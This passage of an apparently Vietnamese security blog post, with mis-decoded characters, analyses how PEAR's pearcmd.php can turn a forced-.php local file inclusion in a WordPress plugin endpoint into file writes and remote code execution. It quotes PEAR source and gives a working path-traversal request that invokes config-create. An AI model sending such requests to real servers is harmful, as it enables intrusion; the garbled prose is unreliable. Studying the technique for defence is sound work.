$GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCommands()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;registerCommands()&lt;/code&gt; ƒë·ªÉ ƒëƒÉng k√Ω c√°c command.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; title=&#34;T·∫•t c·∫£ c√°c command ƒë∆∞·ª£c load v√†o `$all_commands`&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; data-sub-html=&#34;&lt;h2&gt;all_commands&lt;/h2&gt;&lt;p&gt;T·∫•t c·∫£ c√°c command ƒë∆∞·ª£c load v√†o `$all_commands`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#39; alt=&#34;all_commands&#34; height=&#34;390&#34; width=&#34;362&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫•t c·∫£ c√°c command ƒë∆∞·ª£c load v√†o `$all_commands`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ &lt;code&gt;$argv&lt;/code&gt; ƒë∆∞·ª£c kh·ªüi t·∫°o&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$argv = Console_Getopt::readPHPArgv();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function readPHPArgv()&#xA;{&#xA;    global $argv;&#xA;    if (!is_array($argv)) {&#xA;        if (!@is_array($_SERVER[&amp;#39;argv&amp;#39;])) {&#xA;            if (!@is_array($GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;])) {&#xA;                $msg = &amp;#34;Could not read cmd args (register_argc_argv=Off?)&amp;#34;;&#xA;                return PEAR::raiseError(&amp;#34;Console_Getopt: &amp;#34; . $msg);&#xA;            }&#xA;            return $GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;];&#xA;        }&#xA;        return $_SERVER[&amp;#39;argv&amp;#39;];&#xA;    }&#xA;    return $argv;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;$argv&lt;/code&gt; kh√¥ng ph·∫£i m·∫£ng (t·ª©c l√† kh√¥ng c√≥ d·ªØ li·ªáu h·ª£p l·ªá), h√†m s·∫Ω c·ªë g·∫Øng t√¨m gi√° tr·ªã t∆∞∆°ng ƒë∆∞∆°ng ·ªü &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; v√† tr·∫£ v·ªÅ, t·ª©c c√°c &lt;code&gt;search-word&lt;/code&gt; ƒë∆∞·ªùng ta truy·ªÅn trong URL. v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quan s√°t trong debugger:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; title=&#34;Gi√° tr·ªã c·ªßa `$argv` trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; data-sub-html=&#34;&lt;h2&gt;argv1&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa `$argv` trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#39; alt=&#34;argv1&#34; height=&#34;156&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa `$argv` trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ngay sau ƒë√≥ &lt;code&gt;$argv&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c lo·∫°i b·ªè ph·∫ßn t·ª≠ th·ª© nh·∫•t r·ªìi tr·ªü th√†nh ƒë·ªëi s·ªë c·ªßa &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt;, g√≠a tr·ªã tr·∫£ v·ªÅ g√°n cho &lt;code&gt;$options&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_shift($argv);&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√° tr·ªã b√¢y gi·ªù l√†:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; title=&#34;Gi√° tr·ªã c·ªßa `$argv` v√† `$options` trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; data-sub-html=&#34;&lt;h2&gt;argv_options&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa `$argv` v√† `$options` trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#39; alt=&#34;argv_options&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa `$argv` v√† `$options` trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bi·∫øn &lt;code&gt;$command&lt;/code&gt; ƒë∆∞·ª£c kh·ªüi t·∫°o v·ªõi gi√° tr·ªã &lt;code&gt;$options[1][0]&lt;/code&gt; t·ª©c &lt;code&gt;config-create&lt;/code&gt; trong tr∆∞·ªùng h·ª£p n√†y.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = (isset($options[1][0])) ? $options[1][0] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ 1 &lt;code&gt;factory&lt;/code&gt; ƒë∆∞·ª£c t·∫°o v√† g√°n v√†o &lt;code&gt;$cmd&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$cmd = PEAR_Command::factory($command, $config);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi hover v√†o &lt;code&gt;$cmd&lt;/code&gt; ta th·∫•y ƒë∆∞·ª£c c√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh &lt;code&gt;config-create&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; title=&#34;C√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh `config-create`&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; data-sub-html=&#34;&lt;h2&gt;doc&lt;/h2&gt;&lt;p&gt;C√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh `config-create`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#39; alt=&#34;doc&#34; height=&#34;424&#34; width=&#34;861&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°c tham s·ªë y√™u c·∫ßu c·ªßa l·ªánh `config-create`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;V√† ƒë·∫∑c bi·ªát, ta th·∫•y h√†m th·ª±c thi cho &lt;code&gt;config-create&lt;/code&gt; l√† &lt;code&gt;doConfigCreate&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function doConfigCreate($command, $options, $params)&#xA;{&#xA;    if (count($params) != 2) {&#xA;        return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;            &amp;#39;filename to save as&amp;#39;);&#xA;    }&#xA;&#xA;    $root = $params[0];&#xA;    // Clean up the DIRECTORY_SEPARATOR mess&#xA;    $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR;&#xA;    $root = preg_replace(array(&amp;#39;!\\\\&amp;#43;!&amp;#39;, &amp;#39;!/&amp;#43;!&amp;#39;, &amp;#34;!$ds2&amp;#43;!&amp;#34;),&#xA;                            array(&amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;),&#xA;                        $root);&#xA;    if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;        if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;&#xA;        if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;    }&#xA;&#xA;    $windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;    if ($windows) {&#xA;        $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;    }&#xA;&#xA;    if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;        return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    $params[1] = realpath($params[1]);&#xA;    $config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;    if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;        $root = substr($root, 0, strlen($root) - 1);&#xA;    }&#xA;&#xA;    $config-&amp;gt;noRegistry();&#xA;    $config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;    $config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;www_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\www&amp;#34; : &amp;#34;$root/pear/www&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cfg_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cfg&amp;#34; : &amp;#34;$root/pear/cfg&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;ext_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\ext&amp;#34; : &amp;#34;$root/pear/ext&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;doc_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\docs&amp;#34; : &amp;#34;$root/pear/docs&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;test_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\tests&amp;#34; : &amp;#34;$root/pear/tests&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cache_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cache&amp;#34; : &amp;#34;$root/pear/cache&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;download_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\download&amp;#34; : &amp;#34;$root/pear/download&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;temp_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\temp&amp;#34; : &amp;#34;$root/pear/temp&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;bin_dir&amp;#39;, $windows ? &amp;#34;$root\\pear&amp;#34; : &amp;#34;$root/pear&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&#xA;    $config-&amp;gt;writeConfigFile();&#xA;    $this-&amp;gt;_showConfig($config);&#xA;    $this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;        $command);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m b·∫Øt bu·ªôc ph·∫£i nh·∫≠n ƒë√∫ng 2 tham s·ªë: &lt;code&gt;root path&lt;/code&gt; v√† &lt;code&gt;filename&lt;/code&gt;. N·∫øu kh√¥ng, tr·∫£ v·ªÅ l·ªói.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (count($params) != 2) {&#xA;    return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;        &amp;#39;filename to save as&amp;#39;);&#xA;}&#xA;$root = $params[0];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa root path kh√¥ng ph·∫£i l√† &lt;code&gt;/&lt;/code&gt;, h√†m ki·ªÉm tra xem c√≥ b·∫≠t tu·ª≥ ch·ªçn windows kh√¥ng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;    if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;}&#xA;$windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;if ($windows) {&#xA;    $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng ph·∫£i &lt;code&gt;Windows&lt;/code&gt; ‚Üí b·∫Øt l·ªói v√¨ y√™u c·∫ßu ƒë∆∞·ªùng d·∫´n b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu l√† &lt;code&gt;Windows&lt;/code&gt; ‚Üí ki·ªÉm tra ƒë·ªãnh d·∫°ng &lt;code&gt;C:&lt;/code&gt; (th√¥ng qua regex) v√† chuy·ªÉn d·∫•u &lt;code&gt;/&lt;/code&gt; th√†nh &lt;code&gt;\&lt;/code&gt; n·∫øu c·∫ßn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau ƒë√≥, th·ª±c hi·ªán t·∫°o v√† ki·ªÉm tra file c·∫•u h√¨nh ƒë·∫ßu ra&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;    return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;}&#xA;$params[1] = realpath($params[1]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu file ch∆∞a t·ªìn t·∫°i, c·ªë g·∫Øng t·∫°o b·∫±ng &lt;code&gt;touch&lt;/code&gt;. N·∫øu kh√¥ng t·∫°o ƒë∆∞·ª£c ‚Üí l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;realpath&lt;/code&gt; ƒë·ªÉ l·∫•y ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi th·∫≠t s·ª± c·ªßa file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;T·∫°o ƒë·ªëi t∆∞·ª£ng c·∫•u h√¨nh v√† chu·∫©n ho√° $root&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;    $root = substr($root, 0, strlen($root) - 1);&#xA;}&#xA;$config-&amp;gt;noRegistry();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thi·∫øt l·∫≠p c√°c gi√° tr·ªã ƒë∆∞·ªùng d·∫´n&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;$config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;...&#xA;$config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng l√† ghi file c·∫•u h√¨nh, hi·ªÉn th·ªã v√† th√¥ng b√°o th√†nh c√¥ng&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;writeConfigFile();&#xA;$this-&amp;gt;_showConfig($config);&#xA;$this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;    $command);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;writeConfigFile()&lt;/code&gt; l√† h√†m ch√≠nh d√πng ƒë·ªÉ ghi d·ªØ li·ªáu v√†o config file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function writeConfigFile($file = null, $layer = &amp;#39;user&amp;#39;, $data = null)&#xA;{&#xA;    $this-&amp;gt;_lazyChannelSetup($layer);&#xA;    if ($layer == &amp;#39;both&amp;#39; || $layer == &amp;#39;all&amp;#39;) {&#xA;        foreach ($this-&amp;gt;files as $type =&amp;gt; $file) {&#xA;            $err = $this-&amp;gt;writeConfigFile($file, $type, $data);&#xA;            if (PEAR::isError($err)) {&#xA;                return $err;&#xA;            }&#xA;        }&#xA;        return true;&#xA;    }&#xA;&#xA;    if (empty($this-&amp;gt;files[$layer])) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;unknown config file type `$layer&amp;#39;&amp;#34;);&#xA;    }&#xA;&#xA;    if ($file === null) {&#xA;        $file = $this-&amp;gt;files[$layer];&#xA;    }&#xA;&#xA;    $data = ($data === null) ? $this-&amp;gt;configuration[$layer] : $data;&#xA;    $this-&amp;gt;_encodeOutput($data);&#xA;    $opt = array(&amp;#39;-p&amp;#39;, dirname($file));&#xA;    if (!@System::mkDir($opt)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;could not create directory: &amp;#34; . dirname($file));&#xA;    }&#xA;&#xA;    if (file_exists($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; !is_writeable($file)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;no write access to $file!&amp;#34;);&#xA;    }&#xA;&#xA;    $fp = @fopen($file, &amp;#34;w&amp;#34;);&#xA;    if (!$fp) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile fopen(&amp;#39;$file&amp;#39;,&amp;#39;w&amp;#39;) failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;&#xA;    $contents = &amp;#34;#PEAR_Config 0.9\n&amp;#34; . serialize($data);&#xA;    if (!@fwrite($fp, $contents)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile: fwrite failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√¢y l√† h√†m quy·∫øt ƒë·ªãnh vi·ªác ghi config file v·ªõi &lt;code&gt;serialize($data)&lt;/code&gt; ƒë·ªÉ chuy·ªÉn c·∫•u h√¨nh th√†nh chu·ªói c√≥ th·ªÉ l∆∞u tr·ªØ.&lt;/p&gt;&#xA;&lt;p&gt;Tr·ªü l·∫°i file &lt;code&gt;pearcmd.php&lt;/code&gt;, c√°c param ƒë∆∞·ª£c t·∫°o v√† g√°n v√†o &lt;code&gt;$params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;list($tmpopt, $params) = $tmp;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; title=&#34;Gi√° tr·ªã $params trong debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; data-sub-html=&#34;&lt;h2&gt;params&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã $params trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#39; alt=&#34;params&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã $params trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, &lt;code&gt;$cmd&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi b·∫±ng &lt;code&gt;$cmd-&amp;gt;run()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ok = $cmd-&amp;gt;run($command, $opts, $params);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;G·ª≠i GET request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Web &lt;code&gt;include&lt;/code&gt; &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PHP (register_argc_argv=On) build &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; t·ª´ query ‚Üí &lt;code&gt;[&#39;action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&#39;,&#39;config-create&#39;,&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;Console_Getopt::readPHPArgv()&lt;/code&gt; tr·∫£ &lt;code&gt;$argv&lt;/code&gt;; &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt; parse ra &lt;code&gt;$command=&#39;config-create&#39;&lt;/code&gt; v√† &lt;code&gt;list($tmpopt, $params)&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;$params=[&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;doConfigCreate()&lt;/code&gt; ch·∫°y v·ªõi &lt;code&gt;$params&lt;/code&gt; do attacker ki·ªÉm so√°t ‚Üí &lt;code&gt;touch()&lt;/code&gt;/&lt;code&gt;realpath()&lt;/code&gt; v√† &lt;code&gt;writeConfigFile()&lt;/code&gt; t·∫°o/ghi file.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;File c·∫•u h√¨nh ƒë∆∞·ª£c t·∫°o c√≥ ch·ª©a gi√° tr·ªã &lt;code&gt;root path&lt;/code&gt;. N·∫øu gi√° tr·ªã n√†y b·ªã ghi d∆∞·ªõi d·∫°ng m·ªôt th·∫ª PHP h·ª£p l·ªá (&lt;code&gt;&amp;lt;?php ... ?&amp;gt;&lt;/code&gt;) v√† &lt;code&gt;file&lt;/code&gt; c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p b·ªüi client, webserver s·∫Ω x·ª≠ l√Ω n·ªôi dung PHP trong file ƒë√≥ v√† ƒëo·∫°n m√£ s·∫Ω ƒë∆∞·ª£c th·ª±c thi d·∫´n t·ªõi &lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 